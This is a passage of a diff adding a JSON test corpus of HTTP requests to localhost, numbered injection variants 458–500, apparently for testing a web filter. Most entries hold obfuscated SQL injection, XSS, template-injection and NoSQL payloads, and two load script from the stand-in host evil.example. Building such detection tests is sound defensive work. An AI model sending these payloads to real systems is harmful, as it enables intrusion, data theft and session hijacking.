+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "64"
+      ]
+    ],
+    "body": "comment=x%27%20AND%201%3DCONVERT%28int%2C%40%40version%29--&ok=1"
+  },
+  {
+    "name": "injection variant 458 (json)",
+    "method": "POST",
+    "uri": "/api/item",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/json"
+      ],
+      [
+        "Content-Length",
+        "79"
+      ]
+    ],
+    "body": "{\"user\": {\"name\": \"setTimeout(alert,1)\"}, \"tags\": [\"a\", \"setTimeout(alert,1)\"]}"
+  },
+  {
+    "name": "injection variant 459 (arg name)",
+    "method": "GET",
+    "uri": "/item?%3Ca%20href%3D%22javascript%3Aconfirm%281%29%22%3Ex%3C%2Fa%3E=1",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 460 (cookie)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Cookie",
+        "session=abc; pref=1'\tOR\t'1'='1"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 461 (path)",
+    "method": "GET",
+    "uri": "/page/%5Cx31%27%20%5Cx41N%5Cx44%20extra%5Cx63tvalue%281%2Cconc%5C141t%280x7e%5Cu002c%5Cu0076e%5Cu0072%5Cu0073i%5C157n%5Cu0028%5Cx29%29%29--",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 462 (json)",
+    "method": "POST",
+    "uri": "/api/item",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/json"
+      ],
+      [
+        "Content-Length",
+        "107"
+      ]
+    ],
+    "body": "{\"user\": {\"name\": \"JAvascrIpt:Alert(DocuMent.cOokiE)\"}, \"tags\": [\"a\", \"JAvascrIpt:Alert(DocuMent.cOokiE)\"]}"
+  },
+  {
+    "name": "injection variant 463 (cookie)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Cookie",
+        "session=abc; pref=1 OR pg_sleep(5)"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 464 (query)",
+    "method": "GET",
+    "uri": "/item?id=1%20OR%20pg_sleep%285%29",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 465 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "58"
+      ]
+    ],
+    "body": "comment=1%20AND%20BENCHMARK%281000000%2CMD5%281%29%29&ok=1"
+  },
+  {
+    "name": "injection variant 466 (json)",
+    "method": "POST",
+    "uri": "/api/item",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/json"
+      ],
+      [
+        "Content-Length",
+        "67"
+      ]
+    ],
+    "body": "{\"user\": {\"name\": \"2026&#4510-11\"}, \"tags\": [\"a\", \"2026&#4510-11\"]}"
+  },
+  {
+    "name": "injection variant 467 (header)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "X-Comment",
+        "1\\27 \\20 OR\\20 \\27 1\\27  = '1"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 468 (path)",
+    "method": "GET",
+    "uri": "/page/%27%20OR%201%3D1%23",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 469 (json)",
+    "method": "POST",
+    "uri": "/api/item",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/json"
+      ],
+      [
+        "Content-Length",
+        "121"
+      ]
+    ],
+    "body": "{\"user\": {\"name\": \"<input/**/onfocus=alert(1)/**/autofocus>\"}, \"tags\": [\"a\", \"<input/**/onfocus=alert(1)/**/autofocus>\"]}"
+  },
+  {
+    "name": "injection variant 470 (query)",
+    "method": "GET",
+    "uri": "/item?id=1%2F%2A%2A%2FOR%2F%2A%2A%2Fpg_sleep%285%29",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 471 (cookie)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Cookie",
+        "session=abc; pref=\"><scriPt>FEtCH('//X')</sCriPt>"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 472 (cookie)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Cookie",
+        "session=abc; pref={{constructor.constructor('alert(1)')()}}"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 473 (cookie)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Cookie",
+        "session=abc; pref=<script src = //evil.example/x.js></script>"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 474 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "22"
+      ]
+    ],
+    "body": "comment=1%2B1%3D2&ok=1"
+  },
+  {
+    "name": "injection variant 475 (path)",
+    "method": "GET",
+    "uri": "/page/javascript%3Aalert%28document.cookie%29",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 476 (arg name)",
+    "method": "GET",
+    "uri": "/item?admin%26%2339-%26%2345%3B=1",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 477 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "70"
+      ]
+    ],
+    "body": "comment=drop%20%26%2392%3B155e%20a%26%23x20%3Bli%26%2392x6e%5C145&ok=1"
+  },
+  {
+    "name": "injection variant 478 (query)",
+    "method": "GET",
+    "uri": "/item?id=1%2F%5C2a%20%2A%2FOR%2F%2A%5C2a%20%2F1%3D1",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 479 (cookie)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Cookie",
+        "session=abc; pref={{\\u0063onstru\\x63t\\x6f\\u0072.constr\\165ctor\\x28'a\\u006cert(\\x31\\u0029')()\\u007d}"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 480 (query)",
+    "method": "GET",
+    "uri": "/item?id=javascript%3Aalert%28document.cookie%29",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 481 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "52"
+      ]
+    ],
+    "body": "comment=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&ok=1"
+  },
+  {
+    "name": "injection variant 482 (query)",
+    "method": "GET",
+    "uri": "/item?id=%3Cinput%20onfocus%20%3D%20alert%20%281%29%20autofocus%3E",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 483 (query)",
+    "method": "GET",
+    "uri": "/item?id=%3Cscript%20src%3D%2F%2Fevil.example%2Fx.js%3E%3C%2Fscript%3E",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 484 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "49"
+      ]
+    ],
+    "body": "comment=1e%5C31%20u%5C6e%20ion%5C20%20select&ok=1"
+  },
+  {
+    "name": "injection variant 485 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "96"
+      ]
+    ],
+    "body": "comment=%2522%253E%253Cscript%253Efetch%2528%2527%252F%252Fx%2527%2529%253C%252Fscript%253E&ok=1"
+  },
+  {
+    "name": "injection variant 486 (query)",
+    "method": "GET",
+    "uri": "/item?id=",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 487 (arg name)",
+    "method": "GET",
+    "uri": "/item?%7B%7BcONSTRuctOR.constRuctor%28%27aLeRt%281%29%27%29%28%29%7D%7D=1",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 488 (path)",
+    "method": "GET",
+    "uri": "/page/%3Csvg%20onload%3Dalert%281%29%3E",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 489 (header)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "X-Comment",
+        "1' AND extractvalue(1,concat(0x7e,version()))--"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 490 (cookie)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Cookie",
+        "session=abc; pref={{constructor.constructor('alert(1)')()}}"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 491 (query)",
+    "method": "GET",
+    "uri": "/item?id=1%09U%5Cx4eION%5Cx09SEL%5Cx45C%5Cu0054%09us%5C145%5C162%5Cu006e%5Cx61me%5Cx2c%09p%5C141ss%5Cx77%5Cx6fr%5Cx64%09F%5Cu0052OM%09users",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 492 (query)",
+    "method": "GET",
+    "uri": "/item?id=%3Ca%20href%3D%22javascript%3Aconfirm%281%29%22%3Ex%3C%2Fa%3E",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 493 (cookie)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Cookie",
+        "session=abc; pref=\\u0031+1&#x3d%3b\\x32"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 494 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "152"
+      ]
+    ],
+    "body": "comment=%3C%5C61%20%5C20%20%5C68%20ref%3D%22j%5C61%20vas%5C63%20%5C72%20i%5C70%20t%3A%5C63%20o%5C6e%20firm%5C28%20%5C31%20%29%22%3Ex%5C3c%20%2Fa%3E&ok=1"
+  },
+  {
+    "name": "injection variant 495 (cookie)",
+    "method": "GET",
+    "uri": "/",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Cookie",
+        "session=abc; pref=kitap"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 496 (form)",
+    "method": "POST",
+    "uri": "/comment",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/x-www-form-urlencoded"
+      ],
+      [
+        "Content-Length",
+        "42"
+      ]
+    ],
+    "body": "comment=script%2520writing%2520course&ok=1"
+  },
+  {
+    "name": "injection variant 497 (query)",
+    "method": "GET",
+    "uri": "/item?id=setTimeout%28alert%2C1%29",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 498 (arg name)",
+    "method": "GET",
+    "uri": "/item?%3Cbo%5C64%20y%20onl%5C6f%20ad%3D%5C65%20val%5C28%20ato%5C62%20%28%5C27%20%5C59%20Q%3D%3D%27%29%5C29%20%3E=1",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 499 (query)",
+    "method": "GET",
+    "uri": "/item?id=admin%27--",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ]
+    ]
+  },
+  {
+    "name": "injection variant 500 (json)",
+    "method": "POST",
+    "uri": "/api/item",
+    "version": "HTTP/1.1",
+    "headers": [
+      [
+        "Host",
+        "localhost"
+      ],
+      [
+        "User-Agent",
+        "variant test"
+      ],
+      [
+        "Content-Type",
+        "application/json"
+      ],
+      [
+        "Content-Length",
+        "133"
+      ]
+    ],
+    "body": "{\"user\": {\"name\": \"%7B%22%24%5Cu006e%5Cu0065%22%3A%20null%5Cu007d\"}, \"tags\": [\"a\", \"%7B%22%24%5Cu006e%5Cu0065%22%3A%20null%5Cu007d\"]}"
+  }
+]
